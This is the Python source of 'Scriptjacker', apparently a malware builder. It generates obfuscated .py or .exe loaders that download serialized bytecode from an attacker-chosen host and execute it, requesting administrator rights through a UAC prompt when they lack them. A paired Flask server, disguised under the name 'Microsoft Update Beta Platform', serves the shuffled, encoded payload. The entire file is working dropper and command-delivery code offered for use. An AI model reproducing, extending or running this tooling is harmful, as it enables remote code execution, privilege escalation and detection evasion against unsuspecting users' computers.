import random
import shutil
import subprocess as sp
import sys

import click
from colorama import Fore, init
from flask import Flask, jsonify
from pyfiglet import Figlet

import bytemanip as bm
import encoders

click.arg = click.argument
app = Flask("Microsoft Update Beta Platform")  # Windows insider
__version__ = "1.0.1"
init(autoreset=True)


def exegen(output):
    pygen("temp1.py", sysagrv="sys.argv[1:]")
    sp.run("pyinstaller -F temp1.py", shell=True)
    sp.run("echo y | rmdir /s build", shell=True)
    sp.run("del temp1.spec", shell=True)
    shutil.move("dist/temp1.exe", output)
    sp.run("rmdir dist", shell=True)
    sp.run("del temp1.py", shell=True)


def pygen(output, sysargv="sys.argv"):
    if True:
        with open(__file__.removesuffix("scriptjacker.py") + "bytemanip.py") as f:
            bytemanip = f.read()
        s = bytemanip
        s += """\nimport requests
cont=requests.get("$$$$ip$$$$").json()
class abc:
    def __init__(c,argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,consts,names,varnames,filename,name,firstlineno,lnotab,freevars,cellvars):
        (c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,
                    c.co_nlocals, c.co_stacksize, c.co_flags,c.co_consts, c.co_names,
                    c.co_varnames,  c.co_filename, c.co_name,
                    c.co_firstlineno, c.co_lnotab, c.co_freevars, c.co_cellvars)=argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,tuple(consts),tuple(names),tuple(varnames),filename,name,firstlineno,lnotab.encode(),tuple(freevars),tuple(cellvars)
        c.co_const=c.co_consts
c=abc(*cont["cont"])
f=lambda:None
bl=assemble(cont["cl"],c)
code=create_injection(c,bl)
f.__code__=code
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    try:

        f()
    except Exception as e:
        pass
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join($%SYSARGV%$), None, 1)
""".replace(
            "$%SYSARGV%$", sysargv
        )
    ip = input("Please input your desired host ip address and port: ")
    if not (ip.startswith("http")):
        ip = "http://" + ip
    s = s.replace("$$$$ip$$$$", ip)
    with open("temp.py", "w") as f:
        f.write(s)
    sp.run("pyminifier -O --replacement-length=7 temp.py > " + output, shell=True)
    sp.run("del temp.py", shell=True)
    with open(output) as f:
        s = f.readlines()[:-2]
    with open(output, "w") as f:
        f.write("".join(s))


def generatepayload(filetype, output):
    dic = {
        "py": pygen,
        "exe": exegen,
    }
    if filetype in dic:
        pass
    else:
        print("Unsupported filetype")
        exit()
    dic[filetype](output)


@click.group()
@click.option("--no-banner", "no_banner", is_flag=True)
def main(no_banner):
    if no_banner == 0:
        f = Figlet(font="banner3-D")
        print(Fore.GREEN + f.renderText("Scriptjacker Version " + __version__))


@main.command()
@click.arg("output")
def gen(output):
    filetype = output.split(".")[1]
    generatepayload(filetype, output)


@main.command()
@click.option("--port", "-p", "port", default=80)
def server(port):
    file = input("Please enter your filename: ")
    src = "\\".join(__file__.split("\\")[:-1])
    sp.run(f"{sys.executable} -m compileall {file}", shell=True)
    c = bm.dump_pyc(
        "__pycache__/"
        + file.removesuffix(".py")
        + ".cpython-"
        + str(sys.version_info.major)
        + str(sys.version_info.minor)
        + ".pyc"
    )
    bl = bm.disassemble_to_list(c)
    print(bl)
    json = {
        "cont": [
            c.co_argcount,
            c.co_posonlyargcount,
            c.co_kwonlyargcount,
            c.co_nlocals,
            c.co_stacksize,
            c.co_flags,
            c.co_consts,
            c.co_names,
            c.co_varnames,
            c.co_filename,
            c.co_name,
            c.co_firstlineno,
            c.co_lnotab.decode(),
            c.co_freevars,
            c.co_cellvars,
        ],
        "cl": bl,
    }
    json = encoders.stuffjson(json)
    jl = list(json.items())
    random.shuffle(jl)
    json = dict(jl)

    @app.route("/")
    def home():
        return jsonify(json)

    app.run(host="0.0.0.0", port=port)


main()
